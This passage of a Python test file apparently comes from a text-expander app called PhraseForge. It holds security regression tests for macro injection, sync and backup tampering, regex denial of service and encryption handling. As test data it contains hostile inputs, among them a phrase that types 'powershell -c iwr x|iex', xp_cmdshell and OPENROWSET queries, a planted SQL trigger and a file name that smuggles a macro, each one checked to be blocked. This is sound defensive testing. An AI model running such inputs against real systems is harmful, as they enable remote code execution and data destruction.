    out = eng.expand_to_text(f'{{#insert "{evil.id}"}}')
    assert started == [] and "blocked" in out


def test_restore_keeps_settings_the_administrator_locked(tmp_path):
    """R27: File > Open, a backup restore or a sync pull replaced locked settings."""
    from phraseforge import policy
    store = Store(":memory:")
    store.set_setting("ai.provider", "openai")
    store.set_setting("learning.enabled", "0")
    other = Store(tmp_path / "other.db")
    other.set_setting("ai.provider", "evil")
    other.set_setting("learning.enabled", "1")
    other.close()
    policy.set_current(policy.Policy(locked_settings=("learning.*", "ai.provider"), source="test"))
    try:
        for untrusted in (None, "imported", "synced"):
            store.restore_from(tmp_path / "other.db", untrusted=untrusted)
            assert store.setting("ai.provider") == "openai" and store.setting("learning.enabled") == "0"
    finally:
        policy.set_current(None)
        store.close()


def test_variables_an_unapproved_phrase_leaves_cannot_steer_a_trusted_one():
    """R32: {#settemp x calc.exe} in an unapproved phrase, then a trusted {#run {#gettemp x}}."""
    from phraseforge.host import ExpansionContext
    from phraseforge.macros import commands_pe
    store = Store(":memory:")
    for c in ("{#settemp x calc.exe}", "{#set x calc.exe -scope global}", '{#unset x -scope "global"}',
              "{#set x 1 -scope {#var s}}"):
        assert security.scan_privileged(c) == ["change variables other phrases use"], c
    assert security.scan_privileged("{#set x 1}") == [] and security.scan_privileged("{#set x 1 -scope local}") == []
    commands_pe.TEMP_VARS.pop("x", None)
    eng = _engine(store)
    eng.expand_to_text("{#settemp x calc.exe}{#set y evil.exe -scope global}",
                       ExpansionContext(allow_privileged=False))
    assert "x" not in commands_pe.TEMP_VARS and store.get_var("y", "global") in ("", None)


def test_regex_from_a_phrase_cannot_hang_the_expansion():
    """R33: {#regexpos} with (a+)+ took 6.5 s at 26 characters and doubled per character."""
    import time
    from phraseforge import saferegex
    store = Store(":memory:")
    eng = _engine(store)
    t = time.monotonic()
    out = eng.expand_to_text('{#regexpos "' + "a" * 40 + 'b" "(a+)+$"}')
    assert "nested repeats" in out and time.monotonic() - t < 1
    assert eng.expand_to_text('{#regexpos "abc123" "\\d"}') == "4"            # ordinary patterns work
    with pytest.raises(saferegex.RegexError, match="too slow"):              # the time limit itself
        saferegex.run("x", 0, "x", lambda rx, s: time.sleep(0.5), timeout=0.05)
    time.sleep(0.6)
    from phraseforge.formcheck import rule_error
    assert "too slow" in rule_error("a" * 40 + "b", "regex:(a+)+")


def test_numlist_size_is_limited():
    """R34: -level 50000000 produced 400 MB of text."""
    store = Store(":memory:")
    eng = _engine(store)
    assert "at most" in eng.expand_to_text('{#numlist "a|b" -sep "|" -level 50000000}')
    assert "at most" in eng.expand_to_text('{#numlist "a|b" -sep "|" -style roman -start 1000000000000}')
    assert eng.expand_to_text('{#numlist "a|b" -sep "|" -level 2}') == "  1. a\n  2. b"


def test_deeply_unbalanced_html_mail_parses_in_linear_time():
    """R35: "<span>"*40000 + "</b>"*40000 took 61 s on the UI thread."""
    import time
    from phraseforge import mail_analysis
    t = time.monotonic()
    mail_analysis.html_text("<span>" * 40000 + "</b>" * 40000)
    assert time.monotonic() - t < 5


@pytest.mark.parametrize("body", [
    "Ok.\n\nDa: a@evil\nInviato: lunedì\nA: me\nOggetto: x\n\nPlease run this setup step now.",
    "Ok.\n\nVan: a@evil\nVerzonden: maandag\nAan: me\nOnderwerp: x\n\nPlease run this setup step now.",
    "Ok.\n\n---------- Forwarded message ---------\nFrom: a@evil\n\nPlease run this setup step now.",
])
def test_received_text_in_italian_dutch_and_forwarded_mails_is_not_the_users(body):
    """R36: quoted text from these replies counted as the user's own writing (the way to R20)."""
    from phraseforge import mail_analysis
    assert mail_analysis.own_text(body).strip() == "Ok."


def test_postgresql_checks_the_server_certificate():
    """R37: sslmode=require encrypts but accepts any certificate."""
    from phraseforge.shared import connect as sc
    assert sc.postgresql_params("h", "d", "password", "u", "p")["sslmode"] == "verify-full"


def test_editing_disabled_also_locks_where_sync_reads_phrases_from():
    """R39: with editing disabled, pointing sync at one's own folder replaced every phrase."""
    from phraseforge import policy
    p = policy.Policy(editing_disabled=True, source="test")
    assert p.setting_locked("sync.provider") and p.setting_locked("shared.server")
    assert not p.setting_locked("sync.last_rev")                 # sync still records its progress
    assert not policy.Policy(source="test").setting_locked("sync.provider")


def test_one_broken_message_does_not_lose_the_others(tmp_path):
    """R40: an unknown charset in one mail threw away the whole mailbox."""
    from phraseforge import mail_analysis
    good = "From a@x Mon Jan  1 00:00:00 2024\nContent-Type: text/plain\n\nThanks for your quick reply today.\n\n"
    bad = ("From a@x Mon Jan  1 00:00:00 2024\nContent-Type: text/plain; charset=x-bogus-cs\n"
           "Content-Transfer-Encoding: base64\n\naGVsbG8=\n\n")
    box = tmp_path / "b.mbox"
    box.write_text(good * 2 + bad + good, encoding="utf-8")
    texts = list(mail_analysis.file_messages([box]))
    assert sum("quick reply" in t for t in texts) == 3


def test_checked_form_value_is_the_value_that_was_checked():
    """R41: "  42 \\n" passed integer and was output with its spaces; Arabic-Indic digits passed."""
    from phraseforge.formcheck import clean_value, rule_error
    from phraseforge.host import FormField
    f = FormField("n", "N", validate="integer")
    assert clean_value(f, "  42 \n") == "42"
    assert rule_error("١٢٣", "integer") and rule_error("محمد", "letters") == ""
    assert clean_value(FormField("t", "T"), "  keep  ") == "  keep  "


def test_setlevel_inside_an_insert_stays_inside():
    """R42: {#setlevel} in an inserted phrase changed later inserts of the caller."""
    from phraseforge.models import Phrase
    store = Store(":memory:")
    store.add_phrase(Phrase("inner", "{#setlevel de}"))
    p = store.add_phrase(Phrase("hello", "Hello"))
    store.set_phrase_version(p.id, "de", "Hallo")
    assert _engine(store).expand_to_text('{#setlevel de}{#insert "hello"}') == "Hallo"   # setlevel works
    eng = _engine(store)
    assert eng.expand_to_text('{#insert "inner"}{#insert "hello"}') == "Hello"


def test_rtf_drops_control_characters():
    from phraseforge.rtf import escape
    assert escape("a\x00b\x0bc\x1fd\te\nf") == "abcd\\tab e\\line f"


# ====================================================================== 0.6.8: R43-R62
# Review of #34 (macro recorder), #35 (dynamic folders) and #36 (change-set sync).
def test_mouse_clicks_need_an_approved_phrase():
    """R43: an imported phrase clicked the Start button, typed a command and pressed Enter."""
    content = '{#mouse click -x 24 -y 1060}{#sleep 800}powershell -c iwr x|iex{#key enter}'
    assert security.scan_privileged(content) == [security.PRIVILEGED["mouse"]]
    assert security.privileged_reason("mouse", ["wheel"], {}) == security.PRIVILEGED["mouse"]
    from phraseforge.host import ExpansionContext
    store = Store(":memory:")
    out = _engine(store).expand_to_text(content, ExpansionContext(allow_privileged=False))
    assert "[mouse: blocked" in out


def test_mouse_wheel_delta_is_bounded():
    store = Store(":memory:")
    acts = _engine(store).expand("{#mouse wheel -delta 1000000000000}")
    assert [a.delta for a in acts if getattr(a, "kind", "") == "wheel"] == [12000]


def test_sql_triggers_in_a_pulled_copy_are_dropped(tmp_path):
    """R44: a trigger planted in a cloud copy deleted every quarantine row, for good."""
    from phraseforge.models import Phrase
    evil = Store(tmp_path / "evil.db")
    evil.add_phrase(Phrase("Pulled evil", '{#run "calc.exe"}'))
    evil.conn.executescript(
        "CREATE TRIGGER evil AFTER INSERT ON phrase_quarantine BEGIN "
        "DELETE FROM phrase_quarantine WHERE phrase_id=NEW.phrase_id; END;"
        "CREATE VIEW v AS SELECT 1;")
    evil.close()
    store = Store(":memory:")
    store.restore_from(tmp_path / "evil.db", untrusted="synced")
    names = {r[0] for r in store.conn.execute("SELECT name FROM sqlite_master WHERE type IN ('trigger','view')")}
    assert names == {"folders_uid", "phrases_uid", "sticky_notes_uid"}
    assert store.quarantine_origin(store.find_phrase("Pulled evil").id) == "synced"
    opened = Store(tmp_path / "evil.db")                        # a file opened directly is cleaned too
    assert "evil" not in {r[0] for r in opened.conn.execute("SELECT name FROM sqlite_master")}


def _dyn_folder(store, name="Dyn"):
    from phraseforge.models import Folder
    return store.add_folder(Folder(name)).id


def test_a_synced_dynamic_folder_is_not_approved_by_a_plain_ok(qapp, tmp_path, monkeypatch):
    """R45: OK in the dialog approved a source the user never typed (it came with a sync)."""
    from PySide6.QtWidgets import QMessageBox
    from phraseforge import dynamic
    from phraseforge.ui.dynamic_dialog import DynamicFolderDialog
    store = Store(":memory:")
    secret = tmp_path / "Login Data.txt"
    secret.write_text("victim-secret-token", encoding="utf-8")
    fid = _dyn_folder(store)
    dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(secret)), approve=False)
    asked = []
    monkeypatch.setattr(QMessageBox, "warning", staticmethod(lambda *a, **k: asked.append(a[2]) or QMessageBox.No))
    dlg = DynamicFolderDialog(store, fid)
    assert dlg.save() is False and asked and "another PC" in asked[0]
    assert not dynamic.approved(store, fid) and store.phrases(fid) == []


def test_odbc_connection_string_stays_on_this_pc_and_sealed():
    """R46: the ODBC string with PWD= was stored in the phrase file and synced out."""
    from phraseforge import dynamic
    from phraseforge.db import is_device_setting, is_secret_setting
    store = Store(":memory:")
    fid = _dyn_folder(store)
    cs = "DRIVER={SQL Server};SERVER=db;UID=sa;PWD=Hunter2!"
    dynamic.set_config(store, fid, dynamic.DynamicConfig("odbc", cs, "SELECT a FROM t"))
    raw = store.conn.execute("SELECT config FROM dynamic_folders").fetchone()[0]
    assert "Hunter2" not in raw
    key = f"dynamic.conn.{fid}"
    assert is_device_setting(key) and is_secret_setting(key)
    stored = store.conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()[0]
    assert "Hunter2" not in stored                                     # sealed (DPAPI / base64)
    assert dynamic.config(store, fid).path == cs and dynamic.approved(store, fid)


def test_dynamic_source_cannot_be_set_up_under_the_editing_lock(tmp_path):
    """R47: set_config worked while the administrator had locked editing."""
    from phraseforge import dynamic, policy
    store = Store(":memory:")
    fid = _dyn_folder(store)
    f = tmp_path / "x.txt"
    f.write_text("a", encoding="utf-8")
    policy.set_current(policy.Policy(editing_disabled=True, source="t"))
    try:
        with pytest.raises(policy.PolicyError):
            dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(f)))
    finally:
        policy.set_current(None)


@pytest.mark.parametrize("q", ["WITH c AS (SELECT 1 AS a) DELETE FROM t", "SELECT 1 EXEC xp_cmdshell 'calc'",
                               "SELECT * INTO pwned FROM t", "SELECT 1 UPDATE t SET a=2",
                               "SELECT * FROM OPENROWSET('SQLNCLI','x','y')"])
def test_dynamic_query_must_be_a_plain_select(q):
    """R48: T-SQL needs no ';' between statements, so EXEC/UPDATE slipped past the check."""
    from phraseforge import dynamic
    with pytest.raises(dynamic.DynamicError):
        dynamic._check_query(q)


def test_dynamic_query_check_allows_ordinary_selects():
    from phraseforge import dynamic
    for q in ["select ';' as x", "SELECT REPLACE(body, 'a', 'b') FROM t WHERE x = 'drop table'"]:
        assert dynamic._check_query(q)


def test_dynamic_text_source_size_is_limited(tmp_path, monkeypatch):
    """R49: a 100 MB text file took 9.6 GB of memory."""
    from phraseforge import dynamic
    monkeypatch.setattr(dynamic, "MAX_FILE_BYTES", 1000)
    f = tmp_path / "big.txt"
    f.write_text("x\n" * 1000, encoding="utf-8")
    with pytest.raises(dynamic.DynamicError, match="larger"):
        dynamic.read_items(dynamic.DynamicConfig("text", str(f)))


def test_recorder_forgets_keys_and_skips_what_the_check_rejects(qapp):
    """R50: keys stayed in memory after a recording; skip_key keeps PhraseForge's own windows out."""
    from phraseforge.recorder import Recorder
    r = Recorder(password_check=lambda: True)
    r.start()
    for ch in "secret":
        r.key(ord(ch.upper()), ch, set())
    assert r.events == [] and r.skipped_passwords == 6
    from phraseforge.ui import recording_bar
    store = Store(":memory:")
    got = []
    ctl = recording_bar.RecordingController(store, got.append, post=lambda f: f())
    ctl.recorder.start()
    ctl.recorder.key(ord("A"), "a", set())
    ctl.bar = None
    ctl.session = type("S", (), {"stop": lambda self: None})()
    ctl.finish()
    assert got == ["a"] and ctl.recorder.events == []


def test_encrypting_wipes_the_plain_sync_base(tmp_path):
    """R51: a plain .sync-base.db with every phrase stayed next to the encrypted file."""
    from phraseforge import vault
    from phraseforge.models import Phrase
    store = Store(tmp_path / "B.db")
    store.add_phrase(Phrase("Secret", "victim text"))
    base = tmp_path / "B.sync-base.db"
    store.backup_to(base)
    try:
        store.enable_encryption(passphrase="pw", use_dpapi=False)
    except vault.VaultError as e:
        pytest.skip(f"encryption not available here: {e}")
    # since 0.6.9 the base is encrypted in place (R64), so the next merge can still use it
    assert vault.is_encrypted(base) and b"victim text" not in base.read_bytes()
    store.close()


def _sync_pair(tmp_path):
    from phraseforge import policy
    from phraseforge.cloud.sync import CloudSync, FolderRemote
    from phraseforge.models import Phrase
    policy.set_current(policy.NO_POLICY)
    cloud = tmp_path / "cloud"
    a, b = Store(tmp_path / "A.db"), Store(tmp_path / "B.db")
    sa, sb = CloudSync(a, FolderRemote(cloud), device="A"), CloudSync(b, FolderRemote(cloud), device="B")
    a.add_phrase(Phrase("Base", "x"))

    def run(cs):
        res = cs.sync()
        if res.action in ("pulled", "merged"):
            cs.apply_pull(res.pulled_file, res.remote_rev)
        return res
    assert run(sa).action == "pushed" and run(sb).action == "pulled"
    return a, b, sa, sb, cloud, run


def _tamper(cloud, *sql):
    import json as _json
    from phraseforge.cloud.sync import SYNC_NAME
    f = cloud / SYNC_NAME
    con = sqlite3.connect(str(f))
    with con:
        for s in sql:
            con.execute(*s) if isinstance(s, tuple) else con.executescript(s)
    con.close()
    meta = f.with_suffix(".json")
    props = _json.loads(meta.read_text())
    props["rev"], props["hash"] = int(props["rev"]) + 1, "x"
    meta.write_text(_json.dumps(props))


def test_a_broken_remote_copy_does_not_block_every_sync(tmp_path):
    """R52: a bad trigger kind in the other copy made sync() raise on every run."""
    from phraseforge.models import Phrase
    from phraseforge import policy
    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
    try:
        _tamper(cloud, "UPDATE triggers SET kind='nope'", "INSERT INTO triggers (phrase_id, kind, value) "
                "SELECT id, 'nope', 'x' FROM phrases")
        b.add_phrase(Phrase("B local", "b"))
        assert sb.sync().action in ("conflict", "merged")          # asks instead of raising
    finally:
        policy.set_current(None)


def test_a_future_timestamp_does_not_stick(tmp_path):
    """R54: modified='9999' in the other copy won the conflict and stayed on the phrase, so
    it went on beating every later edit made on this PC. A future stamp now counts as the
    time of the merge, and whatever the other copy's text, it arrives quarantined."""
    from phraseforge import policy
    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
    try:
        p = b.find_phrase("Base")
        p.content = "B's text"
        b.update_phrase(p)
        _tamper(cloud, "UPDATE phrases SET content='{#run evil.exe}', modified='9999-12-31T00:00:00'")
        run(sb)
        p = b.find_phrase("Base")
        assert (p.modified or "") < "9000"
        if "evil" in p.content:
            assert b.quarantine_origin(p.id) == "synced"
    finally:
        policy.set_current(None)


def test_a_sync_cannot_remove_a_folder_password(tmp_path):
    """R55: the other copy cleared password_hash, and the phrase came out unquarantined."""
    from phraseforge.models import Folder, Phrase
    from phraseforge import policy
    store = Store(":memory:")
    f = store.add_folder(Folder("Vault", password_hash="scrypt$x"))
    store.add_phrase(Phrase("Secret", "{#run vault.exe}", folder_id=f.id))
    store.backup_to(tmp_path / "copy.db")
    con = sqlite3.connect(str(tmp_path / "copy.db"))
    with con:
        con.execute("UPDATE folders SET password_hash=''")
    con.close()
    policy.set_current(policy.NO_POLICY)
    try:
        store.restore_from(tmp_path / "copy.db", untrusted="synced")
    finally:
        policy.set_current(None)
    assert store.get_folder(f.id).password_hash == "scrypt$x"
    # moving the phrase out of the locked folder changes its fingerprint (and so quarantines it)
    before = store.phrase_fingerprints()
    p = store.find_phrase("Secret")
    p.folder_id = None
    store.update_phrase(p, record_history=False)
    assert store.phrase_fingerprints()[p.id] != before[p.id]


def test_a_pull_keeps_a_local_copy_first(tmp_path):
    """R56: the only backup before a pull went to the cloud the pull came from."""
    from phraseforge import policy
    a, b, sa, sb, cloud, run = _sync_pair(tmp_path)
    policy.set_current(None)
    assert (tmp_path / "B.before-sync.db").exists()


def test_recorder_settings_stay_on_this_pc():
    """R57: a synced recorder.stop_hotkey='e' stopped every recording at the first e."""
    from phraseforge.db import is_device_setting
    from phraseforge.recorder import Recorder
    assert is_device_setting("recorder.stop_hotkey") and is_device_setting("recorder.max_pause_ms")
    t = [0.0]
    r = Recorder(lambda k, d="": "0" if k == "recorder.max_pause_ms" else d, clock=lambda: t[0])
    r.start()
    r.key(ord("A"), "a", set())
    t[0] = 86400.0
    r.key(ord("B"), "b", set())
    assert "{#sleep 60000}" in r.stop()


def test_recorder_drops_middle_clicks_and_merges_real_wheels_only():
    """R58: a middle click replayed as a left click; typed wheel text swallowed real scrolls."""
    from phraseforge.recorder import Recorder
    t = [0.0]
    r = Recorder(clock=lambda: t[0])
    r.start()
    r.click("middle", 10, 20)
    for ch in "{#mouse wheel -delta 120}":
        r.key(0x41, ch, set())
    r.wheel(120)
    t[0] += 0.05
    r.wheel(120)
    out = r.stop()
    assert "-x 10" not in out
    assert out.endswith("{{#mouse wheel -delta 120}{#mouse wheel -delta 240}")


def test_dynamic_approval_does_not_pass_to_a_new_folder(tmp_path):
    """R59: a deleted folder's approval was inherited by a new one with the same id."""
    from phraseforge import dynamic
    store = Store(":memory:")
    f = tmp_path / "x.txt"
    f.write_text("a", encoding="utf-8")
    fid = _dyn_folder(store)
    cfg = dynamic.DynamicConfig("text", str(f))
    dynamic.set_config(store, fid, cfg)
    store.delete_folder(fid)
    fid2 = _dyn_folder(store, "Other")
    dynamic.set_config(store, fid2, cfg, approve=False)
    assert fid2 == fid and not dynamic.approved(store, fid2)


def test_dynamic_folder_source_skips_links_and_brace_names(tmp_path):
    """R60/R61: a symlink to /etc/passwd was read; a "}" in a file name injected a macro."""
    from phraseforge import dynamic
    root = tmp_path / "src"
    root.mkdir()
    (root / "ok.txt").write_text("fine", encoding="utf-8")
    (root / "x}{#run calc}.txt").write_text("bad", encoding="utf-8")     # Windows allows braces, not quotes
    outside = tmp_path / "secret.txt"
    outside.write_text("secret", encoding="utf-8")
    try:
        (root / "link.txt").symlink_to(outside)
    except OSError:
        pass
    items = dynamic.read_items(dynamic.DynamicConfig("folder", str(root), link=True))
    assert [i.description for i in items] == ["ok"]


def test_an_empty_read_keeps_the_dynamic_phrases(tmp_path):
    """R62: a source that was empty for a moment deleted every phrase in the folder."""
    from phraseforge import dynamic
    store = Store(":memory:")
    f = tmp_path / "x.txt"
    f.write_text("one\ntwo", encoding="utf-8")
    fid = _dyn_folder(store)
    dynamic.set_config(store, fid, dynamic.DynamicConfig("text", str(f)))
    assert dynamic.refresh(store, fid) == (2, 0, 0)
    f.write_text("", encoding="utf-8")
    with pytest.raises(dynamic.DynamicError):
        dynamic.refresh(store, fid)
    assert len(store.phrases(fid)) == 2


# ---------------------------------------------------------------- 0.6.9: review of #38 (R63–R75)
@pytest.fixture
def vault_env(monkeypatch):
    from phraseforge import vault
    monkeypatch.setattr(vault, "FAKE_DPAPI_FOR_TESTS", True)
    monkeypatch.setattr(Store, "FLUSH_SECONDS", 0.05)
    return vault


SECRET69 = "R63 secret phrase text"


def _enc_store(tmp_path, vault, passphrase="old-passphrase", use_dpapi=True):
    from phraseforge.models import Phrase
    s = Store(tmp_path / "phrases.db")
    s.add_phrase(Phrase("Secret", SECRET69))
    s.enable_encryption(passphrase, use_dpapi=use_dpapi)
    return s


def test_changing_the_passphrase_gives_the_file_a_new_key(tmp_path, vault_env):
    """R63: the data key never changed, so a copy taken before (old passphrase or DPAPI entry)
    still unlocked the current file, and "ask every start" could be bypassed."""
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    stolen = tmp_path / "stolen-copy.db"
    stolen.write_bytes((tmp_path / "phrases.db").read_bytes())
    s.change_passphrase("new-passphrase", use_dpapi=False)
    s.close()
    old_key = vault.unlock(vault.header_of(stolen))            # the old copy's DPAPI entry
    with pytest.raises(vault.VaultError):
        vault.decrypt((tmp_path / "phrases.db").read_bytes(), old_key)
    old_pass = vault.unlock(vault.header_of(stolen), "old-passphrase")
    with pytest.raises(vault.VaultError):
        vault.decrypt((tmp_path / "phrases.db").read_bytes(), old_pass)


def test_changing_the_passphrase_reencrypts_the_local_backups(tmp_path, vault_env):
    """R63: a backup kept its DPAPI entry after the switch to "ask every start"."""
    from phraseforge import io_formats
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    b = io_formats.backup(s, tmp_path / "backups")
    assert vault.header_of(b)["wraps"].keys() == {"dpapi", "pass"}
    s.change_passphrase("new-passphrase", use_dpapi=False)
    assert set(vault.header_of(b)["wraps"]) == {"pass"}
    with pytest.raises(vault.NeedPassphrase):
        vault.unlock(vault.header_of(b))
    assert vault.connect(b, passphrase="new-passphrase").execute("SELECT count(*) FROM phrases").fetchone()[0] == 1
    s.close()


def test_turning_encryption_on_encrypts_older_plain_backups(tmp_path, vault_env):
    """R64: backups made before encryption stayed plain although the dialog said they were encrypted."""
    from phraseforge import io_formats
    from phraseforge.models import Phrase
    vault = vault_env
    s = Store(tmp_path / "phrases.db")
    s.add_phrase(Phrase("Secret", SECRET69))
    b = io_formats.backup(s, tmp_path / "backups")
    assert SECRET69.encode() in b.read_bytes()
    s.enable_encryption("old-passphrase")
    assert vault.is_encrypted(b) and SECRET69.encode() not in b.read_bytes()
    assert not list((tmp_path / "backups").glob("*.plain-old"))
    s.close()


def test_a_crash_while_encrypting_does_not_open_an_empty_file(tmp_path, vault_env):
    """R65: a crash after the plain file was wiped left only phrases.db.enc; the next start
    created a new, empty phrase file."""
    from phraseforge.models import Phrase
    vault = vault_env
    s = Store(tmp_path / "x.db")
    s.add_phrase(Phrase("Secret", SECRET69))
    data = s.conn.serialize()
    s.close()
    db = tmp_path / "phrases.db"
    vault.write(str(db) + ".enc", data, vault.Key.new("old-passphrase"))   # what the crash left
    s2 = Store(db)
    assert [p.content for p in s2.phrases()] == [SECRET69]
    s2.close()


def test_a_failed_switch_to_encryption_keeps_the_store_usable(tmp_path, vault_env, monkeypatch):
    """R65: a failure in the middle (antivirus lock) left a closed store and no phrase file."""
    import os as _os
    s = Store(tmp_path / "phrases.db")
    from phraseforge.models import Phrase
    s.add_phrase(Phrase("Secret", SECRET69))
    real = _os.replace

    def flaky(a, b):
        if str(a).endswith(".enc"):
            raise PermissionError("locked by another program")
        return real(a, b)
    monkeypatch.setattr("phraseforge.db.os.replace", flaky)
    with pytest.raises(OSError):
        s.enable_encryption("old-passphrase")
    monkeypatch.setattr("phraseforge.db.os.replace", real)
    assert [p.content for p in s.phrases()] == [SECRET69]
    s.close()
    assert [p.content for p in Store(tmp_path / "phrases.db").phrases()] == [SECRET69]


def test_plain_sync_temp_copies_are_overwritten_when_encrypted(tmp_path, vault_env, monkeypatch):
    """R66: the plain snapshot uploaded by Backup & Sync was only unlinked in %TEMP%."""
    from phraseforge.cloud.sync import CloudSync, FolderRemote
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    wiped = []
    real = vault.wipe
    monkeypatch.setattr(vault, "wipe", lambda p: (wiped.append(str(p)), real(p)))
    CloudSync(s, FolderRemote(tmp_path / "cloud")).backup_now()
    assert any("pf-snap-" in w for w in wiped)
    s.close()


def test_the_decrypted_database_keeps_temp_data_in_memory(tmp_path, vault_env):
    """R67: sorts and VACUUM of the in-memory database spilled plain pages to %TEMP%."""
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    assert s.conn.execute("PRAGMA temp_store").fetchone()[0] == 2
    s.close()


@pytest.mark.parametrize("header", [b"[]", b'{"wraps": []}',
                                    b'{"wraps": {"pass": {"n": 16384, "r": 8, "p": 64}}}',
                                    b'{"wraps": {"pass": {"n": 1048576, "r": 8, "p": 1, "salt": "", "nonce": "", "ct": ""}}}'])
def test_a_damaged_header_gives_a_vault_error(tmp_path, vault_env, header):
    """R68: a malformed header crashed the start (AttributeError/KeyError); p was unbounded."""
    import struct
    vault = vault_env
    f = tmp_path / "bad.db"
    f.write_bytes(vault.MAGIC + struct.pack(">I", len(header)) + header + bytes(40))
    with pytest.raises(vault.VaultError):
        vault.read(f, passphrase="whatever-pass")


def test_change_with_empty_fields_keeps_the_passphrase(tmp_path, vault_env):
    """R69: "Change" with the passphrase fields empty silently removed the recovery passphrase,
    and the current passphrase was never asked for."""
    from PySide6.QtWidgets import QApplication
    QApplication.instance() or QApplication([])
    from phraseforge.ui.encryption_dialog import EncryptionDialog
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    dlg = EncryptionDialog(s)
    assert dlg.problem()                        # the current passphrase is required
    dlg.current.setText("old-passphrase")
    assert dlg.apply()
    assert s.vault_key.has_passphrase
    assert s.check_passphrase("old-passphrase")
    s.close()


def test_a_plain_file_put_back_is_reported(tmp_path, vault_env):
    """R70: a plain copy restored in place of the encrypted file opened silently."""
    from phraseforge.models import Phrase
    s = Store(tmp_path / "phrases.db")
    s.add_phrase(Phrase("Secret", SECRET69))
    plain = tmp_path / "old.db"
    s.backup_to(plain)
    s.enable_encryption("old-passphrase")
    s.close()
    (tmp_path / "phrases.db").write_bytes(plain.read_bytes())
    s2 = Store(tmp_path / "phrases.db")
    assert not s2.encrypted and s2.vault_warning
    s2.close()


def test_an_older_copy_cannot_undo_ask_every_start(tmp_path, vault_env):
    """R70: an older file with a DPAPI entry opened without the passphrase in "ask" mode."""
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    older = (tmp_path / "phrases.db").read_bytes()
    s.change_passphrase("new-passphrase", use_dpapi=False)
    s.close()
    (tmp_path / "phrases.db").write_bytes(older)
    s2 = Store(tmp_path / "phrases.db")
    assert s2.vault_warning
    s2.flush()
    assert "dpapi" not in vault.header_of(tmp_path / "phrases.db")["wraps"]
    s2.close()


def test_save_as_database_copy_keeps_encryption(tmp_path, vault_env, monkeypatch):
    """R71: File > Save As "Database copy" wrote every phrase in plain text."""
    from PySide6.QtWidgets import QApplication, QFileDialog, QMessageBox
    QApplication.instance() or QApplication([])
    from phraseforge.ui.main_window import MainWindow
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    out = tmp_path / "copy.db"
    monkeypatch.setattr(QFileDialog, "getSaveFileName", staticmethod(lambda *a, **k: (str(out), "")))
    monkeypatch.setattr(QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.Yes))
    w = MainWindow(s)
    w.save_as()
    w.close()
    assert vault.is_encrypted(out) and SECRET69.encode() not in out.read_bytes()
    s.close()


def test_an_older_encrypted_backup_can_be_restored(tmp_path, vault_env):
    """R72: after encryption was turned off and on, older encrypted backups failed to restore."""
    from phraseforge import io_formats
    vault = vault_env
    s = _enc_store(tmp_path, vault)
    b = tmp_path / "keep" / "phrases-old.db"
    b.parent.mkdir()
    s.backup_to(b, keep_encryption=True)
    s.disable_encryption()
    s.enable_encryption("other-passphrase")
    s.restore_from(b)
    assert [p.content for p in s.phrases()] == [SECRET69]
    s.close()
    assert io_formats is not None


def test_skipped_phrases_are_logged_without_their_name(tmp_path, caplog):
    """R73: the log (never encrypted) held phrase names."""
    from phraseforge.models import Phrase
    s = Store(tmp_path / "phrases.db")
    p = s.add_phrase(Phrase("Salary of Ahmed", "x"))
    with caplog.at_level("INFO"):
        appmod._skipped_phrase(_App(s), p, "not approved")
    assert "Salary of Ahmed" not in caplog.text
    s.close()


def test_passphrases_are_unicode_normalised_and_scrypt_is_stronger(tmp_path, vault_env):
    """R74: a passphrase typed with combining marks did not match; N was 2^15."""
    import unicodedata
    vault = vault_env
    nfc = unicodedata.normalize("NFC", "مُحَمَّد-café-2026")
    nfd = unicodedata.normalize("NFD", nfc)
    assert nfc != nfd
    k = vault.Key.new(nfc, use_dpapi=False)
    assert k.wraps["pass"]["n"] >= 2 ** 17
    assert vault.unlock({"wraps": k.wraps}, nfd).dek == k.dek


def test_the_key_is_not_printed_and_save_failures_are_reported(tmp_path, vault_env, monkeypatch):
    """R75: repr(Key) printed the data key; a failing save was only logged."""
    vault = vault_env
    k = vault.Key.new("old-passphrase")
    assert repr(k.dek) not in repr(k)
    s = _enc_store(tmp_path, vault)
    errors = []
    s.on_flush_error = errors.append
    monkeypatch.setattr(vault, "write", lambda *a, **kw: (_ for _ in ()).throw(OSError("disk full")))
    from phraseforge.models import Phrase
    s.add_phrase(Phrase("Later", "y"))
    import time as _t
    _t.sleep(0.4)
    assert errors and "disk full" in errors[0] and len(errors) == 1
    monkeypatch.undo()
    s._stop_flusher()


def test_a_plain_sync_base_part_is_wiped_on_encrypt(tmp_path, vault_env):
    """R75: a plain .sync-base.part left by a crash stayed next to the encrypted file."""
    from phraseforge.models import Phrase
    s = Store(tmp_path / "phrases.db")
    s.add_phrase(Phrase("Secret", SECRET69))
    part = tmp_path / "phrases.sync-base.part"
    s.backup_to(part)
    s.enable_encryption("old-passphrase")
    assert not part.exists()
    s.close()


def test_recovery_never_deletes_an_encrypted_leftover(tmp_path, vault_env):
    """R65: an older version may already have made a new, empty file next to the only copy."""
    vault = vault_env
    s = Store(tmp_path / "x.db")
    from phraseforge.models import Phrase
    s.add_phrase(Phrase("Secret", SECRET69))
    data = s.conn.serialize()
    s.close()
    db = tmp_path / "phrases.db"
    vault.write(str(db) + ".enc", data, vault.Key.new("old-passphrase"))
    import sqlite3 as _sq                   # the empty file an older start created
    c = _sq.connect(db)
    c.execute("CREATE TABLE t (x)")
    c.commit()
    c.close()
    Store(db).close()
    kept = tmp_path / "phrases.db.enc.recovered"
    assert kept.exists() and vault.is_encrypted(kept)


# ---------------------------------------------------------------- 0.6.11: review of #39, #41, #42, #44–#51 (R76–R96)
def test_a_pulled_folder_with_the_library_roots_id_is_not_the_library(tmp_path):
    """R76: row ids are reused; a folder from a pull that got the library root's old id was taken
    for the library: stripped from pushes, renamed, and deleted on unmount."""
    from phraseforge import libraries
    from phraseforge.cloud.sync import _strip
    from phraseforge.models import Folder, Phrase
    t = Store(tmp_path / "team.db")
    t.add_phrase(Phrase("Team phrase", "team text"))
    t.close()
